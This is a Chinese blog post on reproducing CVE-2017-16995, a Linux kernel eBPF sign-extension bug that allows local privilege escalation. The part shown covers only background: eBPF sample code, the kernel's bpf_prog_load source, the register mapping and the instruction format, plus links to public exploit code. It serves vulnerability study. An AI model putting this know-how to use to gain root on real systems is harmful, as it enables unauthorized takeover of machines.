<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="CVE,Linux Vulnerability," />










<meta name="description" content="对eBPF模块中由于s32到u64的符号扩展问题导致的漏洞CVE-2017-16995的复现。">
<meta name="keywords" content="CVE,Linux Vulnerability">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-16995复现">
<meta property="og:url" content="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="对eBPF模块中由于s32到u64的符号扩展问题导致的漏洞CVE-2017-16995的复现。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/1.png">
<meta property="og:image" content="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/2.png">
<meta property="og:image" content="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/3.png">
<meta property="og:updated_time" content="2020-03-15T13:03:14.190Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2017-16995复现">
<meta name="twitter:description" content="对eBPF模块中由于s32到u64的符号扩展问题导致的漏洞CVE-2017-16995的复现。">
<meta name="twitter:image" content="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/"/>





  <title>CVE-2017-16995复现 | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2020/03/07/CVE-2017-16995复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2017-16995复现</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-07T15:54:18+08:00">
                2020-03-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>对eBPF模块中由于s32到u64的符号扩展问题导致的漏洞CVE-2017-16995的复现。<br><a id="more"></a><br>CVE-2017-16995最初是由Google project zero披露，并公开了相关poc，在2017年12月23日，Bruce Leidl公布了<a href="https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c" target="_blank" rel="noopener">提权代码</a>。在2018年3月中旬，Vitaly Nikolenko在推特上发布消息说Ubuntu 16.04存在高危漏洞，可以进行本地提权，同时公布了<a href="http://cyseclabs.com/exploits/upstream44.c" target="_blank" rel="noopener">exp</a>。整个过程仅利用精心构造的数据就可以劫持控制流，是属于Data-Oriented Attacks在Linux kernel上的一个典型应用。</p>
<h1 id="eBPF模块"><a href="#eBPF模块" class="headerlink" title="eBPF模块"></a>eBPF模块</h1><p>eBPF源于成型于BSD上的技术BPF(Berkeley Packet Filter)，BPF是一个用于过滤网络报文(Packet)的架构，常用的抓包软件tcpdump,wireshark都基于整个模块对用户提供抓包接口。BPF根据规则过滤保温，将符合条件的报文由内核空间复制到用户空间。eBPF是基于原有的BPF，重新设计了一个新的BPF模块，在Linux 3.17加入到kernel/bpf中，新的BPF被命名为extended BPF，简称eBPF。BPF提供了一个内核与用户进行代码和数据传输的桥梁，用户可以使用eBPF指令字节码的形式编写代码并传入内核，通过相关事件触发内核执行用户传入的代码。可以注入代码必然存在安全隐患，eBPF制定了复杂的verifier机制，在运行用户代码之前，先要进行一系列的安全检查，采用模拟执行的方式进行检查，最大程度的防止eBPF代码在真实执行时发生攻击。</p>
<h2 id="eBPF-sample"><a href="#eBPF-sample" class="headerlink" title="eBPF sample"></a>eBPF sample</h2><p>Linux内核代码的samples/bpf目录下有bpf的使用示例，以一个简答的sample来说明一个eBPF过滤代码的编写过程。因为后续调试内核版本是v4.4.110，所以源码版本是v4.4.110。示例代码如下，整个过程分为三部分。这里涉及到的bpf_create_map,bpf_prog_load都是samplesz中自定义的函数，仅在samples中调用，利用系统调用syscall(<strong>NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))和syscall(</strong>NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))实现，后面介绍的这两个函数是内核真正实现和运行的函数源码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/samples/bpf/sock_example.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_sock</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sock = <span class="number">-1</span>, map_fd, prog_fd, i, key;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> value = <span class="number">0</span>, tcp_cnt, udp_cnt, icmp_cnt;</span><br><span class="line"></span><br><span class="line">	map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(key), <span class="keyword">sizeof</span>(value), <span class="number">256</span>);  <span class="comment">//创建map</span></span><br><span class="line">	<span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"failed to create map '%s'\n"</span>, strerror(errno));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//编写的eBPF代码</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">		BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),</span><br><span class="line">		BPF_LD_ABS(BPF_B, ETH_HLEN + offsetof(struct iphdr, protocol) <span class="comment">/* R0 = ip-&gt;proto */</span>),</span><br><span class="line">		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="number">-4</span>), <span class="comment">/* *(u32 *)(fp - 4) = r0 */</span></span><br><span class="line">		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>), <span class="comment">/* r2 = fp - 4 */</span></span><br><span class="line">		BPF_LD_MAP_FD(BPF_REG_1, map_fd),</span><br><span class="line">		BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">		BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">		BPF_MOV64_IMM(BPF_REG_1, <span class="number">1</span>), <span class="comment">/* r1 = 1 */</span></span><br><span class="line">		BPF_RAW_INSN(BPF_STX | BPF_XADD | BPF_DW, BPF_REG_0, BPF_REG_1, <span class="number">0</span>, <span class="number">0</span>), <span class="comment">/* xadd r0 += r1 */</span></span><br><span class="line">		BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>), <span class="comment">/* r0 = 0 */</span></span><br><span class="line">		BPF_EXIT_INSN(),</span><br><span class="line">	&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将eBPF代码加载至内核</span></span><br><span class="line">	prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, <span class="keyword">sizeof</span>(prog),</span><br><span class="line">				<span class="string">"GPL"</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"failed to load prog '%s'\n"</span>, strerror(errno));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将用户自定义的eBPF代码绑定到指定的sockert上</span></span><br><span class="line">	<span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd,</span><br><span class="line">		       <span class="keyword">sizeof</span>(prog_fd)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//执行eBPF代码，过滤socket数据包，此时为真实执行</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		key = IPPROTO_TCP;</span><br><span class="line">		assert(bpf_lookup_elem(map_fd, &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		key = IPPROTO_UDP;</span><br><span class="line">		assert(bpf_lookup_elem(map_fd, &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		key = IPPROTO_ICMP;</span><br><span class="line">		assert(bpf_lookup_elem(map_fd, &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"TCP %lld UDP %lld ICMP %lld packets\n"</span>,</span><br><span class="line">		       tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	<span class="comment">/* maps, programs, raw sockets will auto cleanup on process exit */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1.首先调用bpf_create_map创建一个map，在attr结构体中指定map的类型、key和value的大小、最大容量，函数返回一个map_fd描述符。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/samples/bpf/libbpf.c#L21</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size,</span></span></span><br><span class="line"><span class="function"><span class="params">		   <span class="keyword">int</span> value_size, <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;attr, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">	attr.map_type = map_type;</span><br><span class="line">	attr.key_size = key_size;</span><br><span class="line">	attr.value_size = value_size;</span><br><span class="line">	attr.max_entries = max_entries;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sys_bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.调用bpf_prog_load将用户编写的eBPF代码prog加载至内核，attr结构体包含了指令的类型，指令首地址，指令长度，日志大小，日志级别等，然后会进行一系列检查，检查核心在于bpf_check函数，采用模拟执行的方式进行检查。这个下文中会有分析。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c#L621</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">enum</span> bpf_prog_type type = attr-&gt;prog_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">bool</span> is_gpl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对传入的attr结构体进行检查，主要检查各个成员的大小</span></span><br><span class="line">	<span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">    <span class="comment">//从用户空间获取eBPF程序证书</span></span><br><span class="line">	<span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">			      <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">    <span class="comment">//规定eBPF程序必须与GPL兼容</span></span><br><span class="line">	is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查指令条数是否超过BPF_MAXINSNS，BPF_MAXINSNS定义为4096</span></span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//检查指令类型以及程序指定的内核版本</span></span><br><span class="line">	<span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">	    attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">    <span class="comment">//创建buf_prog结构体，用于存储用户定义的eBPF指令以及相关参数</span></span><br><span class="line">	prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">	<span class="keyword">if</span> (!prog)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	err = bpf_prog_charge_memlock(prog);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">	prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">	err = -EFAULT;</span><br><span class="line">    <span class="comment">//将eBPF指令拷贝至prog结构体指向的内存中</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">			   prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">	prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">	prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">	prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">    <span class="comment">//判断过滤程序的过滤模式，是socket_filter（socket数据包过滤）还是tracing_filter（系统调用号及参数过滤）</span></span><br><span class="line">	err = find_prog_type(type, prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* run eBPF verifier */</span></span><br><span class="line">    <span class="comment">//执行eBPF的verifier机制</span></span><br><span class="line">	err = bpf_check(&amp;prog, attr);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">    <span class="comment">//修正eBPF指令中call和跳转令的操作数范围</span></span><br><span class="line">	fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">    <span class="comment">//JIT加载</span></span><br><span class="line">	err = bpf_prog_select_runtime(prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	err = bpf_prog_new_fd(prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* failed to allocate fd */</span></span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_used_maps:</span><br><span class="line">	free_used_maps(prog-&gt;aux);</span><br><span class="line">free_prog:</span><br><span class="line">	bpf_prog_uncharge_memlock(prog);</span><br><span class="line">free_prog_nouncharge:</span><br><span class="line">	bpf_prog_free(prog);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.用户调用setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(prog_fd)) &lt; 0)将用户自定义的eBPF代码绑定到指定的socket上，此时代码已经拷贝至内核，由prog_fd指向bpf_prog的结构体维护。成功绑定后，对socket数据包执行eBPF代码，此时为真实执行。</p>
<h1 id="eBPF指令集"><a href="#eBPF指令集" class="headerlink" title="eBPF指令集"></a>eBPF指令集</h1><p>eBPF指令集与我们常见的汇编指令有所不同，它拥有R0~R10共11个虚拟寄存器，它有一个栈，使用map结构与用户进行交互，前文中也提到调用bpf_create_map创建一个map。在64位下，R0~R10与CPU中的10个物理寄存器对应如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R0 -- RAX</span><br><span class="line">R1 -- RDI</span><br><span class="line">R2 -- RSI</span><br><span class="line">R3 -- RDX</span><br><span class="line">R4 -- RCX</span><br><span class="line">R5 -- R8</span><br><span class="line">R6 -- RBX</span><br><span class="line">R7 -- R13</span><br><span class="line">R8 -- R14</span><br><span class="line">R9 -- R15</span><br><span class="line">R10 -- RBP</span><br></pre></td></tr></table></figure></p>
<p>每条指令对应的数据结构如下,在示例中prog的类型就是struct bpf_insn：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v4.4.110/source/include/uapi/linux/bpf.h#L58</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">	__u8	code;		<span class="comment">/* opcode */</span>  <span class="comment">//操作码</span></span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span>    <span class="comment">//目标寄存器</span></span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span>  <span class="comment">//源寄存器</span></span><br><span class="line">	__s16	off;		<span class="comment">/* signed offset */</span>    <span class="comment">//指令偏移</span></span><br><span class="line">	__s32	imm;		<span class="comment">/* signed immediate constant */</span>  <span class="comment">//立即数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>eBPF的操作码一共有8大类，一个code有8个bit，code的低三位代表了指令的类型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v4.4.110/source/include/uapi/linux/bpf_common.h#L6</span></span><br><span class="line"><span class="comment">/* Instruction classes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LD		0x00  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LDX		0x01  <span class="comment">//load指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ST		0x02  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_STX		0x03  <span class="comment">//store指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ALU		0x04  <span class="comment">//计算指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JMP		0x05  <span class="comment">//跳转指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_RET		0x06  <span class="comment">//返回指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MISC    0x07  <span class="comment">//其他指令</span></span></span><br></pre></td></tr></table></figure></p>
